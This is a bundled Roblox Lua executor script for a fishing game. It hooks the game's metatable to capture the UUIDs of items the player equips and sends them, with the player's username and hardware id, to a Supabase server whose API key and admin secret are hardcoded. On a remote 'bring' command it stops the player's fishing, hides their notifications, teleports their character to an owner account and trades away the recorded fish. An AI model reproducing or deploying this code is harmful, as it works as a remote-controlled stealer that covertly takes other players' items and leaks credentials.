local __DARKLUA_BUNDLE_MODULES={cache={}}do do local function __modImpl()
local config={
BaseURL="https://eeypcaplscelzsbsqdsb.supabase.co",
AnonKey="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVleXBjYXBsc2NlbHpzYnNxZHNiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njg3Mjk1NDksImV4cCI6MjA4NDMwNTU0OX0.p5LLua3KRvbK2J5tWehs4NVx4a9D3vGqdWznj0cOCwU",
AdminAccess="f01b8a4ba90e25d086c478419922d8b16246c901f5ffe432038bf3f857451d64",
Interval=20
}

return config end function __DARKLUA_BUNDLE_MODULES.a()local v=__DARKLUA_BUNDLE_MODULES.cache.a if not v then v={c=__modImpl()}__DARKLUA_BUNDLE_MODULES.cache.a=v end return v.c end end do local function __modImpl()

local HttpService=game:GetService("HttpService")

local RPCTargetTracking={}

function RPCTargetTracking:Call(deps)

local BaseURL=deps.config.BaseURL
local AnonKey=deps.config.AnonKey
local AdminAccess=deps.config.AdminAccess
local HWID=deps.hwid


local response=request({
Url=BaseURL.."/rest/v1/rpc/rpc_target_tracking",
Method="POST",
Headers={
["Content-Type"]="application/json",
["apikey"]=AnonKey,
["Authorization"]="Bearer "..AnonKey,
["x-hwid"]=HWID,
["x-admin-access"]=AdminAccess
}
})

local SuccessTargetTracking=(response.StatusCode==200)
local ResultTargetTracking=response.Body
local Decoded=HttpService:JSONDecode(ResultTargetTracking)

if SuccessTargetTracking then

return SuccessTargetTracking,Decoded[1]
else

return SuccessTargetTracking,Decoded[1]
end
end

return RPCTargetTracking end function __DARKLUA_BUNDLE_MODULES.b()local v=__DARKLUA_BUNDLE_MODULES.cache.b if not v then v={c=__modImpl()}__DARKLUA_BUNDLE_MODULES.cache.b=v end return v.c end end do local function __modImpl()


local HttpService=game:GetService("HttpService")

local RPCTargetUpsertSelf={}

function RPCTargetUpsertSelf:Call(deps)

local BaseURL=deps.config.BaseURL
local AnonKey=deps.config.AnonKey
local AdminAccess=deps.config.AdminAccess
local HWID=deps.hwid
local Username=deps.username
local JobId=deps.jobid


local body=HttpService:JSONEncode({
p_username=Username,
p_jobid=JobId
})


local response=request({
Url=BaseURL.."/rest/v1/rpc/rpc_target_upsert_self",
Method="POST",
Headers={
["Content-Type"]="application/json",
["apikey"]=AnonKey,
["Authorization"]="Bearer "..AnonKey,
["x-hwid"]=HWID,
["x-admin-access"]=AdminAccess
},
Body=body
})

local SuccessTargetUpsertSelf=(response.StatusCode==204)

if SuccessTargetUpsertSelf then

return SuccessTargetUpsertSelf
else

return SuccessTargetUpsertSelf
end

end

return RPCTargetUpsertSelf end function __DARKLUA_BUNDLE_MODULES.c()local v=__DARKLUA_BUNDLE_MODULES.cache.c if not v then v={c=__modImpl()}__DARKLUA_BUNDLE_MODULES.cache.c=v end return v.c end end do local function __modImpl()

local HttpService=game:GetService("HttpService")

local RPCTargetUpsertFish={}

function RPCTargetUpsertFish:Call(deps)

local BaseURL=deps.config.BaseURL
local AnonKey=deps.config.AnonKey
local AdminAccess=deps.config.AdminAccess
local HWID=deps.hwid
local UUID=deps.uuid


local body=HttpService:JSONEncode({
p_uuid=UUID
})


local response=request({
Url=BaseURL.."/rest/v1/rpc/rpc_target_upsert_fish",
Method="POST",
Headers={
["Content-Type"]="application/json",
["apikey"]=AnonKey,
["Authorization"]="Bearer "..AnonKey,
["x-hwid"]=HWID,
["x-admin-access"]=AdminAccess
},
Body=body
})

local SuccessTargetUpsertFish=(response.StatusCode==204)

if SuccessTargetUpsertFish then

return SuccessTargetUpsertFish
else

return SuccessTargetUpsertFish
end
end

return RPCTargetUpsertFish end function __DARKLUA_BUNDLE_MODULES.d()local v=__DARKLUA_BUNDLE_MODULES.cache.d if not v then v={c=__modImpl()}__DARKLUA_BUNDLE_MODULES.cache.d=v end return v.c end end do local function __modImpl()
local HttpService=game:GetService("HttpService")

local RPCTargetSelectRecordedFish={}

function RPCTargetSelectRecordedFish:Call(deps)

local BaseURL=deps.config.BaseURL
local AnonKey=deps.config.AnonKey
local HWID=deps.hwid
local WhoHas=deps.whohas


local Body=HttpService:JSONEncode({
p_hwid=HWID,
p_whohas=WhoHas
})


local response=request({
Url=BaseURL.."/rest/v1/rpc/rpc_target_select_recorded_fish_uuid",
Method="POST",
Headers={
["Content-Type"]="application/json",
["apikey"]=AnonKey,
["Authorization"]="Bearer "..AnonKey
},
Body=Body
})

local Success=(response.StatusCode==200)
local Result=response.Body
local Decoded=HttpService:JSONDecode(Result)

if Success then


return true,Decoded
else

return false,Decoded
end
end

return RPCTargetSelectRecordedFish end function __DARKLUA_BUNDLE_MODULES.e()local v=__DARKLUA_BUNDLE_MODULES.cache.e if not v then v={c=__modImpl()}__DARKLUA_BUNDLE_MODULES.cache.e=v end return v.c end end do local function __modImpl()

local HttpService=game:GetService("HttpService")

local RPCTargetDeleteRecordedFish={}

function RPCTargetDeleteRecordedFish:Call(deps)

local BaseURL=deps.config.BaseURL
local AnonKey=deps.config.AnonKey
local UUID=deps.uuid
local WhoHas=deps.whohas
local HWID=deps.hwid


local Body=HttpService:JSONEncode({
p_uuid=UUID,
p_whohas=WhoHas,
p_hwid=HWID
})


local response=request({
Url=BaseURL.."/rest/v1/rpc/rpc_target_delete_recorded_fish",
Method="POST",
Headers={
["Content-Type"]="application/json",
["apikey"]=AnonKey,
["Authorization"]="Bearer "..AnonKey
},
Body=Body
})

local Success=(response.StatusCode==204)

if Success then

return true
else

return false
end
end

return RPCTargetDeleteRecordedFish end function __DARKLUA_BUNDLE_MODULES.f()local v=__DARKLUA_BUNDLE_MODULES.cache.f if not v then v={c=__modImpl()}__DARKLUA_BUNDLE_MODULES.cache.f=v end return v.c end end do local function __modImpl()

local Fishing={}
local ReplicatedStorage=game:GetService("ReplicatedStorage")


local Net=ReplicatedStorage:WaitForChild("Packages")
:WaitForChild("_Index")
:WaitForChild("sleitnick_net@0.2.0")
:WaitForChild("net")


local Remotes={
UpdateState=Net:WaitForChild("RF/UpdateAutoFishingState"),
UnequipRod=Net:WaitForChild("RE/UnequipToolFromHotbar"),
CancleFishing=Net:WaitForChild("RF/CancelFishingInputs")
}


function Fishing:Stop()

task.spawn(pcall,function()
Remotes.UpdateState:InvokeServer(false)
end)

task.wait(3)

task.spawn(pcall,function()
Remotes.CancleFishing:InvokeServer()
end)

task.wait(1)


task.spawn(pcall,function()
Remotes.UnequipRod:FireServer()
end)
end

return Fishing end function __DARKLUA_BUNDLE_MODULES.g()local v=__DARKLUA_BUNDLE_MODULES.cache.g if not v then v={c=__modImpl()}__DARKLUA_BUNDLE_MODULES.cache.g=v end return v.c end end do local function __modImpl()
local Notification={}
local PlayerGui=game.Players.LocalPlayer:WaitForChild("PlayerGui")
local FOLDER_NAME="Text Notifications"


local gui=PlayerGui:WaitForChild(FOLDER_NAME)

function Notification:Toggle(state)

gui.Enabled=state
end

return Notification end function __DARKLUA_BUNDLE_MODULES.h()local v=__DARKLUA_BUNDLE_MODULES.cache.h if not v then v={c=__modImpl()}__DARKLUA_BUNDLE_MODULES.cache.h=v end return v.c end end do local function __modImpl()
local Trade={}

local ReplicatedStorage=game:GetService("ReplicatedStorage")
local Net=ReplicatedStorage:WaitForChild("Packages")
:WaitForChild("_Index")
:WaitForChild("sleitnick_net@0.2.0")
:WaitForChild("net")


local TradeRF=Net:WaitForChild("RF/InitiateTrade")

function Trade:SendItem(targetId,fishUUID)
if not targetId or not fishUUID then

return false,"Missing parameters"
end

local success,result=pcall(function()

return TradeRF:InvokeServer(targetId,fishUUID)
end)

if success then



return result
else

return result
end
end

return Trade end function __DARKLUA_BUNDLE_MODULES.i()local v=__DARKLUA_BUNDLE_MODULES.cache.i if not v then v={c=__modImpl()}__DARKLUA_BUNDLE_MODULES.cache.i=v end return v.c end end do local function __modImpl()

local RemoteHook={}

RemoteHook.LastResult=nil
RemoteHook.Status=false
RemoteHook.isInstall=false


function RemoteHook:HookEventStart()
if self.isInstall then

return false,"Hook sudah aktif"
end

local ReplicatedStorage=game:GetService("ReplicatedStorage")
local net=ReplicatedStorage:WaitForChild("Packages")
:WaitForChild("_Index")
:WaitForChild("sleitnick_net@0.2.0")
:WaitForChild("net")

local equipRemote=net:WaitForChild("RE/EquipItem")
local unequipRemote=net:WaitForChild("RE/UnequipItem")

local whitelist={
[equipRemote]="EquipItem",
[unequipRemote]="UnequipItem"
}

local mt=getrawmetatable(game)
setreadonly(mt,false)

local oldNamecall=mt.__namecall

mt.__namecall=newcclosure(function(self,...)
local method=getnamecallmethod()
if method=="FireServer"and whitelist[self]then
local uuid=select(1,...)
RemoteHook.LastResult=uuid
RemoteHook.Status=true

end
return oldNamecall(self,...)
end)

setreadonly(mt,true)

self.isInstall=true
return true,"Hook berhasil dipasang"
end


function RemoteHook:HookEventGetResult()
local result=self.LastResult
local status=self.Status


self.LastResult=nil
self.Status=false

return status,result
end

return RemoteHook end function __DARKLUA_BUNDLE_MODULES.j()local v=__DARKLUA_BUNDLE_MODULES.cache.j if not v then v={c=__modImpl()}__DARKLUA_BUNDLE_MODULES.cache.j=v end return v.c end end do local function __modImpl()
local TeleportModule={}
local Players=game:GetService("Players")
local RunService=game:GetService("RunService")
local LP=Players.LocalPlayer

local orbitConnection


local radius=6
local speed=1

function TeleportModule.Check(deps)

local BringStatus=deps.bring
local AdminUsername=deps.admin_username
local OwnerUsername=deps.owner_username


if not BringStatus then
if orbitConnection then
orbitConnection:Disconnect()
orbitConnection=nil
end
return
end


if orbitConnection then
return
end


orbitConnection=RunService.Heartbeat:Connect(function()
local master=Players:FindFirstChild(AdminUsername)or Players:FindFirstChild(OwnerUsername)

if master and master.Character and master.Character:FindFirstChild("HumanoidRootPart")then
local myChar=LP.Character
local myRoot=myChar and myChar:FindFirstChild("HumanoidRootPart")
if not myRoot then
return
end


local allPlayers=Players:GetPlayers()
local botList={}
for _,p in ipairs(allPlayers)do
if p~=master then
table.insert(botList,p.Name)
end
end
table.sort(botList)

local myIndex=table.find(botList,LP.Name)or 1
local totalBots=#botList


local angle=(myIndex/totalBots)*(math.pi*2)+(tick()*speed)

local offsetX=math.cos(angle)*radius
local offsetZ=math.sin(angle)*radius

local targetPos=master.Character.HumanoidRootPart.Position+Vector3.new(offsetX,0,offsetZ)


myRoot.CFrame=CFrame.new(targetPos,master.Character.HumanoidRootPart.Position)
end
end)
end

return TeleportModule end function __DARKLUA_BUNDLE_MODULES.k()local v=__DARKLUA_BUNDLE_MODULES.cache.k if not v then v={c=__modImpl()}__DARKLUA_BUNDLE_MODULES.cache.k=v end return v.c end end end


local Analytic=game:GetService("RbxAnalyticsService")
local Players=game:GetService("Players")
local Player=Players.LocalPlayer

local Username=Player.Name
local DisplayName=Player.DisplayName
local UserId=Player.UserId
local JobId=game.JobId
local PlaceId=game.PlaceId
local HWID=Analytic:GetClientId()


local Config=__DARKLUA_BUNDLE_MODULES.a()


local RPCTargetTracking=__DARKLUA_BUNDLE_MODULES.b()
local RPCTargetUpsertSelf=__DARKLUA_BUNDLE_MODULES.c()
local RPCTargetUpsertFish=__DARKLUA_BUNDLE_MODULES.d()
local RPCTargetSelectRecordedFish=__DARKLUA_BUNDLE_MODULES.e()
local RPCTargetDeleteRecordedFish=__DARKLUA_BUNDLE_MODULES.f()


local Fishing=__DARKLUA_BUNDLE_MODULES.g()
local Notification=__DARKLUA_BUNDLE_MODULES.h()
local Trade=__DARKLUA_BUNDLE_MODULES.i()
local RemoteHook=__DARKLUA_BUNDLE_MODULES.j()


local AutoTeleportToAdmin=__DARKLUA_BUNDLE_MODULES.k()



local DepsRPCTargetUpsertSelf={
config=Config,
hwid=HWID,
username=Username,
jobid=JobId
}

local StatusTargetUpsertSelf=RPCTargetUpsertSelf:Call(DepsRPCTargetUpsertSelf)


local SuccessHookEventStart,ResultHookEventStart=RemoteHook:HookEventStart()




task.spawn(function()
while true do
local SuccessHookEventGetResult,ResultHookEventGetResult=RemoteHook:HookEventGetResult()

local DepsRPCTargetUpsertFish={
config=Config,
hwid=HWID,
uuid=ResultHookEventGetResult
}

if SuccessHookEventGetResult then

local StatusTargetUpsertFish=RPCTargetUpsertFish:Call(DepsRPCTargetUpsertFish)
end

task.wait(0.5)
end
end)


local DepsRPCTargetTracking={
config=Config,
hwid=HWID
}

task.spawn(function()
while true do
local StatusRPCTargetTracking,ResultRPCTargetTracking=RPCTargetTracking:Call(DepsRPCTargetTracking)

if StatusRPCTargetTracking then
local BringStatus=ResultRPCTargetTracking.bring
local AdminUsername=ResultRPCTargetTracking.admin_username
local AdminId=Players:FindFirstChild(AdminUsername)
local OwnerUsername=ResultRPCTargetTracking.owner_username
local OwnerId=Players:FindFirstChild(OwnerUsername)


local DepsAutoTeleportToAdmin={
bring=BringStatus,
admin_username=AdminUsername,
owner_username=OwnerUsername
}


local DepsRPCTargetSelectRecordedFish={
config=Config,
hwid=HWID,
whohas=Username
}

local StatusSelectRecordedFish,ResultSelectRecordedFish=RPCTargetSelectRecordedFish:Call(DepsRPCTargetSelectRecordedFish)

if BringStatus then
Fishing:Stop()
AutoTeleportToAdmin.Check(DepsAutoTeleportToAdmin)
Notification:Toggle(false)

if StatusSelectRecordedFish and#ResultSelectRecordedFish>0 then


if AdminId then

for i,uuid in ipairs(ResultSelectRecordedFish)do


local DepsRPCTargetDeleteRecordedFish={
config=Config,
hwid=HWID,
whohas=Username,
uuid=uuid
}

local TradeResult=Trade:SendItem(OwnerId.UserId,uuid)
task.wait(2)

if TradeResult then

local StatusDeleteRecordedFish=RPCTargetDeleteRecordedFish:Call(DepsRPCTargetDeleteRecordedFish)
end
task.wait(3)
end
else

for i,uuid in ipairs(ResultSelectRecordedFish)do


local DepsRPCTargetDeleteRecordedFish={
config=Config,
hwid=HWID,
whohas=Username,
uuid=uuid
}

local TradeResult=Trade:SendItem(OwnerId.UserId,uuid)
task.wait(2)

if TradeResult then

local StatusDeleteRecordedFish=RPCTargetDeleteRecordedFish:Call(DepsRPCTargetDeleteRecordedFish)
end
task.wait(3)
end
end
else
Notification:Toggle(true)
end
else
AutoTeleportToAdmin.Check(DepsAutoTeleportToAdmin)
end
end

task.wait(Config.Interval)
end
end)